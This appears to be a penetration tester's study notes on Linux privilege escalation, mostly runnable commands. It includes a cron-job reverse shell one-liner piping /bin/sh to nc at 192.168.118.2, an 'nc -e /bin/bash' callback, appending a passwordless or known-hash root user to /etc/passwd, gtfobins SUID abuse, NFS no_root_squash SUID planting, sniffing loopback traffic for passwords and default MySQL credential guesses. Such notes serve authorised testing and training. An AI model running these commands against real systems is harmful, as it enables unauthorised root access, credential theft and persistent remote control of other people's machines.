- [ ] openssl write password hash
- [ ] check for suid bits and gtfobins it out
- [ ] sudo -l 
- [ ] getcapes
- [ ] check kernel priv esc with searchsploit
- [ ] tcpdump/watch -n 1
- [ ] check cron jobs cat /etc/crontab
  

## Enumerating Linux

#### Understanding Files and Users Privileges on Linux

```c
find / -perm /4000 2>/dev/null
```

#### Manual Enumeration


### Linux kernel versions newer than 5.8 are affected by Dirtypipe

- [ ] Transfer 3 files in folder, 
![[Pasted image 20231125122822.png]]
- [ ] chmod +x compile.sh
- [ ] ./compile.sh
- [ ] you are now root


#### Automated Enumeration
/usr/bin/unix-privesc-check
## Exposed Confidential Information
#### Inspecting User Trails

```
env
cat /
```

```c
/usr/sbin/getcap -r / 2>/dev/null
```
#### Inspecting Service Footprints

```
watch -n 1 "ps -aux | grep pass"
```
watch daemon for clear text passwords

```
sudo tcpdump -i lo -A | grep "pass"
```

**check if sysadmin accounts have select access to tcpdump since it uses raw sockets


## Inspecting File Permissions
#### Abusing Cron Jobs

```
grep "CRON" /var/log/syslog
```

Cron job one liner for reverse call back:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
```
*or
```
nc 192.168.45.238 4444 -e /bin/bash
```

#### Abusing Password Authentication
*Historically however, password hashes, along with other account information, were stored in the world-readable file **/etc/passwd**. For backwards compatibility, if a password hash is present in the second column of an **/etc/passwd** user record, it is considered valid for authentication and it takes precedence over the respective entry in **/etc/shadow**, if available. This means that if we can write into **/etc/passwd**, we can effectively set an arbitrary password for any account.

```
openssl passwd w00t
echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
w00t
id
```


## Insecure System Components

#### Abusing Setuid Binaries and Capabilities

Abuse of find command via gtfobins
```
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

```
/usr/sbin/getcap -r / 2>/dev/null
```

#### Abusing Sudo

```
sudo -l

gtfobins.com
```


#### Exploiting Kernel Vulnerabilities

```
cat /etc/issue

uname -r

arch

searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

gcore

```
ps -ef | grep password
strings the core dum
```

## sudo 1.8.1 priv esc


https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
If you've ever found yourself in a situation where you compiled an older kernel exploit on your Kali Linux and tested it on the target, only to be hit with an error that reads as follows

```shell
/path/to/libc.so.6: version 'GLIBC_2.34' not found
```

#### Supported Architectures

Currently, XenSpawn will run on x64 hosts

#### Usage

```shell
# Clone the repo locally, or download the script
kali@kali:~$ git clone https://github.com/X0RW3LL/XenSpawn.git

# cd into the cloned repo
kali@kali:~$ cd XenSpawn/

# Make the script executable
kali@kali:~/XenSpawn$ chmod +x spawn.sh

# Note: the script must be run as root
# Note: MACHINE_NAME is a custom name you will be
#       spawning the container with
kali@kali:~/XenSpawn$ sudo ./spawn.sh MACHINE_NAME

# Starting the newly spawned container
# Note: MACHINE_NAME is to be replaced with the machine name of choice
kali@kali:~/XenSpawn$ sudo systemd-nspawn -M MACHINE_NAME

Spawning container MACHINE_NAME on /var/lib/machines/MACHINE_NAME.
Press ^] three times within 1s to kill container.

root@MACHINE_NAME:~$ exit
logout
Container MACHINE_NAME exited successfully.
```


## I just got a low-priv shell !**  


**python** -c 'import pty; pty.spawn("/bin/bash")'  
OR  
**python3** -c 'import pty; pty.spawn("/bin/bash")'  
```c
export **PATH**=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
export **TERM**=xterm-256color  
alias **ll**='ls -lsaht --color=auto'  
**Ctrl + Z** [Background Process]  
stty raw -echo **;** fg **;** reset  
stty columns 200 rows 200
```


  ##### Various Capabilities?_ 
```c
which gcc  
which cc  
which python
which perl  
which wget  
which curl  
which fetch  
which nc 
which ncat 
which nc.traditional
which socat
```
  
#### Compilation? (**Very Back Burner**)**  
```c
file /bin/bash
uname -a  
cat /etc/-release  
cat /etc/issue  

  
**What Arch?  
file /bin/bash  
  
**Kernel?  
uname -a  

**Issue/Release?**  
cat /etc/issue  
cat /etc/release

#Are we a _real user_?
sudo -l  
ls -lsaht /etc/sudoers  
```


#### Are any users a member of exotic groups?*
```c
groups <user>
```

#### Situational Awareness
##### Users 
```c
cd /home/  
ls -lsaht
```

##### Web Configs_ containing credentials? 
```c
cd /var/www/html/  
ls -lsaht  
```
  
##### SUID_ Binaries? 
```c
find / -perm -u=s -type f 2>/dev/null  
```

##### GUID_ Binaries? 
```c
find / -perm -g=s -type f 2>/dev/null  
```
  
##### Binary/Languages with "_Effective Permitted_" or "_Empty Capability_" (**ep**):
_Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.  
```c
getcap -r / 2>/dev/null
```

##### Start monitoring the system if possible while performing our enumeration...**  
```c
cd /var/tmp/  
File Transfer **-->** pspy32  
File Transfer **-->** pspy64  
chmod 755 pspy32 pspy64  
./pspy<32/64>  
```
  
##### What does the local network look like?**  
```c
netstat -antup  
netstat -tunlp  
```  

##### Is anything vulnerable running as root?**  
```c
ps aux |grep -i 'root' --color=auto  
```
  
##### MYSQL Credentials? Root Unauthorized Access?**  
```c
mysql -uroot -p  
Enter Password:  
root : root  
root : toor  
root :
```

##### Take a quick look at etc to see if any user-level people did special things:**  
```c
cd /etc/  
ls -lsaht  

# Anything other than root here?_  
• Any config files left behind?  
→ ls -lsaht |grep -i ‘.conf’ --color=auto
```

##### If we have root priv information disclosure - are there any .secret in /etc/ files?**  
```c
ls -lsaht |grep -i ‘.secret’ --color=auto
```

##### SSH Keys I can use perhaps for even further compromise?**  
```c
ls -lsaR /home/  
```

##### Quick look in:
```c
ls -lsaht /var/lib/  
ls -lsaht /var/db/  
```
  
**Quick look in:**  
```c
ls -lsaht /opt/  
ls -lsaht /tmp/  
ls -lsaht /var/tmp/  
ls -lsaht /dev/shm/
ls -lsaht /opt/ /tmp/ /var/tmp/ /dev/shm/

```

##### NFS? Can we exploit weak NFS Permissions?
```c
cat /etc/exports
#no_root_squash? 
```

**[On Attacking Machine]**  
```c
mkdir -p /mnt/nfs/  
mount -t nfs -o vers=<version 1,2,3> <$IP>: <NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid  
cp suid /mnt/nfs/  
chmod u+s /mnt/nfs/suid  
su <user id matching target machine's user-level privilege.>  
```
  
**[On Target Machine]**  
```c
user@host$ ./suid  
```

##### Where can I live on this machine?_ Where can I read, write and execute files?
```c
/var/tmp/  
/tmp/  
/dev/shm/
```

**Any exotic file system mounts/extended attributes?**  
```c
cat /etc/fstab  
```

##### Can we write as a low-privileged user to /etc/passwd?
```c
openssl passwd -1  
i<3hacking  
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.  
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd  
su siren  
id  
```
  
##### Cron.
```c
crontab –u root –l  
```
  
###### Look for unusual system-wide cron jobs:
```c
cat /etc/crontab  
ls /etc/cron
```

###### Bob is a user on this machine. What is every single file he has ever created?
```c
find / -user miguel 2>/dev/null  
```

##### Any mail?** **mbox in User $HOME directory?**  
```c
cd /var/mail/  
ls -lsaht  
```
  
**Linpease**:  
[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  
](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
**Traitor:**  
[https://github.com](https://github.com/liamg/traitor)[/](https://github.com/liamg/traitor)[liamg/traitor  
](https://github.com/liamg/traitor)  
**GTFOBins:**  
[https://gtfobins.github.io/](https://gtfobins.github.io/)  
  
**PSpy32/Pspy64:**  
[https://github.com/DominicBreuker/pspy/blob/master/README.md](https://github.com/DominicBreuker/pspy/blob/master/README.md)